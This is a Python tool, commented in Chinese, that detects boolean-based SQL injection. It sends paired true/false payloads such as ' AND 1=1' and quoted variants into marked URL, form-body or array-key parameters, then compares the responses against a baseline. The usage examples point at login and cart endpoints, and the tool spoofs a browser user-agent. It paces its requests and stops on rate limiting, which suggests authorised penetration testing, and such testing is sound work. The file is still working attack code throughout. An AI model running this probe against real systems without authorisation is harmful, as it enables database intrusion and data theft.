#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""inject_probe.py —— 成对布尔注入取证器（慢速、留证、限速自适应）。

方法论：基线 / 真值 / 假值 三态对照。注入成立的判据是
    真值响应 ≡ 基线响应   且   假值响应 ≢ 基线响应
真值与假值同态 → 该位点不可注入（或有输入校验/过滤）。

限速自适应：命中 429 / 422「过于频繁」/ 403「安全校验未通过」等限速特征时
立即停止，不再发请求，并报告已用请求数与建议冷却（因为限速是应用的正当防护）。

Usage:
  python inject_probe.py --target "http://host/p?id=1*" --context numeric --base 1
  python inject_probe.py --target "http://host/login" --method POST \
      --data "email=1*&password=x" --context quoted --base 1
  python inject_probe.py --target "http://host/cart/update" --method POST \
      --data "_csrf=TOKEN&product_id=113&qty[113*]=20" --context arraykey --base 113

可选：--pairs N（几组真/假对，默认 1）--gap 秒（默认 30）--marker 字符串（响应特征）
      --proxy/--cookie/--header/--out/--out-dir/--timeout/--user-agent/--scope-note
Exit codes: 0 完成, 1 错误, 2 限速中止, 3 参数错误。
"""
import argparse
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

RATE_LIMIT_HINTS = ("过于频繁", "稍后再试", "too many requests", "rate limit",
                    "安全校验未通过", "页面停留过久", "try again later")
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")


def build_payload(context, truth):
    """注入后缀：truth=True 使条件为真，truth=False 使条件为假（左侧固定 '1'，只变右侧）。
    模板形如 id=1* / qty[113*]，* 处插入本后缀。"""
    right = 1 if truth else 2
    if context == "numeric":
        return " AND 1=%d" % right
    if context == "quoted":
        return "' AND '1'='%d' -- " % right
    if context == "arraykey":
        return " AND 1=%d" % right
    raise ValueError("未知 context: " + context)


def _inject(text, payload, base):
    """把载荷插到 * 处；若该段整体就是 *（值或键完全为空位），补上基线值。"""
    if text == "*":
        return base + payload
    return text.replace("*", payload, 1)


def replace_marker(template, payload):
    """模板里 * 标记注入点（可能在值里，也可能在数组键名里）。"""
    if "*" not in template:
        raise ValueError("模板里必须有 * 标记注入点")
    idx = template.index("*")
    return template[:idx] + payload + template[idx + 1:]


def apply_to_url(url, payload, base="1"):
    """把 payload 注入到 URL 的查询参数值/键名里，并做 URL 编码。"""
    if "*" not in url:
        return url
    parts = urllib.parse.urlsplit(url)
    if not parts.query:
        return url
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    out = []
    for k, v in pairs:
        if "*" in k:
            k = _inject(k, payload, base)
        if "*" in v:
            v = _inject(v, payload, base)
        out.append((k, v))
    qs = urllib.parse.urlencode(out, quote_via=urllib.parse.quote)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, qs, parts.fragment))


def apply_to_body(data, payload, base="1"):
    """把 payload 注入到请求体的参数值/键名里，重新编码。"""
    if not data or "*" not in data:
        return data
    pairs = urllib.parse.parse_qsl(data, keep_blank_values=True)
    out = []
    for k, v in pairs:
        if "*" in k:
            k = _inject(k, payload, base)
        if "*" in v:
            v = _inject(v, payload, base)
        out.append((k, v))
    return urllib.parse.urlencode(out, quote_via=urllib.parse.quote)


def send(op, url, method, body, headers):
    req = urllib.request.Request(url, data=body.encode() if body is not None else None,
                                 headers=headers, method=method)
    try:
        with op.open(req, timeout=30) as r:
            text = r.read().decode("utf-8", "replace")
            return r.status, text, dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)


def is_rate_limited(status, text):
    low = text.lower()
    if status == 429:
        return True
    if any(h in low for h in RATE_LIMIT_HINTS):
        return True
    return False


def signature(status, text, marker):
    sig = {"status": status, "len": len(text)}
    if marker:
        sig["marker"] = text.count(marker)
    return sig


def same(a, b):
    return a.get("status") == b.get("status") and a.get("len") == b.get("len") \
        and a.get("marker") == b.get("marker")


def main():
    p = argparse.ArgumentParser(description="Paired boolean injection probe (slow, evidence-keeping, rate-limit aware)")
    p.add_argument("--target", required=True, help="含 * 标记的完整地址")
    p.add_argument("--method", default="GET")
    p.add_argument("--data", default=None, help="POST 体，含 * 标记")
    p.add_argument("--context", default="numeric", choices=["numeric", "quoted", "arraykey"])
    p.add_argument("--base", required=True, help="基线值，如 1 或 113")
    p.add_argument("--pairs", type=int, default=1)
    p.add_argument("--gap", type=float, default=30)
    p.add_argument("--marker", default=None, help="响应特征串（出现次数作为判据）")
    p.add_argument("--proxy", default=None)
    p.add_argument("--cookie", default=None)
    p.add_argument("--header", action="append", default=[])
    p.add_argument("--user-agent", default=DEFAULT_UA)
    p.add_argument("--scope-note", default="")
    p.add_argument("--out", default="inject-evidence.json")
    p.add_argument("--out-dir", default="inject-raw")
    p.add_argument("--timeout", type=float, default=30)
    args = p.parse_args()

    if "*" not in args.target and (not args.data or "*" not in args.data):
        print("REFUSED: target 或 data 里必须有 * 标记注入点")
        return 3

    handlers = []
    if args.proxy:
        handlers.append(urllib.request.ProxyHandler({"http": args.proxy, "https": args.proxy}))
    else:
        handlers.append(urllib.request.ProxyHandler({}))
    op = urllib.request.build_opener(*handlers)
    headers = {"User-Agent": args.user_agent, "Accept-Encoding": "identity"}
    if args.cookie:
        headers["Cookie"] = args.cookie
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.data:
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    out_dir = os.path.abspath(args.out_dir)
    os.makedirs(out_dir, exist_ok=True)
    evidence = {"target": args.target, "method": args.method, "context": args.context,
                "base": args.base, "scope_note": args.scope_note or None,
                "started_at": time.strftime("%Y-%m-%d %H:%M:%S"), "probes": []}

    def probe(tag, payload, tpl_url, tpl_data):
        url = apply_to_url(tpl_url, payload, args.base) if "*" in tpl_url else tpl_url
        body = apply_to_body(tpl_data, payload, args.base) if tpl_data and "*" in tpl_data else tpl_data
        st, text, hdrs = send(op, url, args.method.upper(), body, headers)
        limited = is_rate_limited(st, text)
        sig = signature(st, text, args.marker)
        raw_path = os.path.join(out_dir, "%s.txt" % tag.replace(" ", "_"))
        with open(raw_path, "w", encoding="utf-8") as f:
            f.write("URL: %s\n\n" % url)
            if body:
                f.write("BODY: %s\n\n" % body)
            f.write(text)
        evidence["probes"].append({"tag": tag, "payload": payload, "url": url,
                                    "status": st, "signature": sig,
                                    "rate_limited": limited, "raw": raw_path})
        print("[%-18s] status=%-4s len=%-7d marker=%-4s %s%s"
              % (tag, st, sig["len"], sig.get("marker", "-"),
                 "⚠限速" if limited else "",
                 ("  " + text[:0]) if False else ""))
        return st, text, sig, limited

    print("=== 成对布尔取证：%s（%s 上下文，间隔 %ds）===" % (args.target, args.context, args.gap))
    used = 0
    baseline = None
    verdict = "inconclusive"
    try:
        st, text, sig, limited = probe("baseline 基线", args.base, args.target, args.data)
        used += 1
        if limited:
            print("\n限速中（基线就被拦），停止。已用 %d 发请求。冷却后再试。" % used)
            evidence["verdict"] = "rate_limited"
            evidence["requests_used"] = used
            _save(evidence, args.out)
            return 2
        baseline = sig
        time.sleep(args.gap)

        for pair in range(1, args.pairs + 1):
            for kind, truth in (("true", True), ("false", False)):
                payload = build_payload(args.context, truth)
                st, text, sig, limited = probe("%s#%d %s" % (kind, pair, kind), payload,
                                               args.target, args.data)
                used += 1
                if limited:
                    print("\n限速中止于第 %d 发。已用 %d 发请求，冷却后再试。" % (used, used))
                    evidence["verdict"] = "rate_limited"
                    evidence["requests_used"] = used
                    _save(evidence, args.out)
                    return 2
                kind_key = "%s#%d" % (kind, pair)
                evidence.setdefault("comparisons", []).append(
                    {"pair": pair, "kind": kind, "same_as_baseline": same(sig, baseline),
                     "signature": sig})
                if kind == "true" and pair == 1:
                    true_same = same(sig, baseline)
                if kind == "false" and pair == 1:
                    false_same = same(sig, baseline)
                time.sleep(args.gap)
            # 判定
            if true_same and not false_same:
                verdict = "INJECTABLE"
            elif true_same and false_same:
                verdict = "not_injectable_same_behavior"
            elif not true_same and not false_same:
                verdict = "inconclusive_both_differ"
            else:
                verdict = "inconclusive_mixed"
            if verdict == "INJECTABLE":
                break
    except KeyboardInterrupt:
        print("\n已中断。")
        evidence["verdict"] = "interrupted"
        _save(evidence, args.out)
        return 1

    evidence["verdict"] = verdict
    evidence["requests_used"] = used
    _save(evidence, args.out)
    print("\n=== 判定：%s ===" % verdict)
    for c in evidence.get("comparisons", []):
        print("  %-10s 与基线同态=%s  %s" % (c["kind"], c["same_as_baseline"], c["signature"]))
    print("证据: %s（原始响应在 %s/）" % (os.path.abspath(args.out), out_dir))
    return 0


def _save(evidence, out):
    with open(os.path.abspath(out), "w", encoding="utf-8") as f:
        json.dump(evidence, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    sys.exit(main())
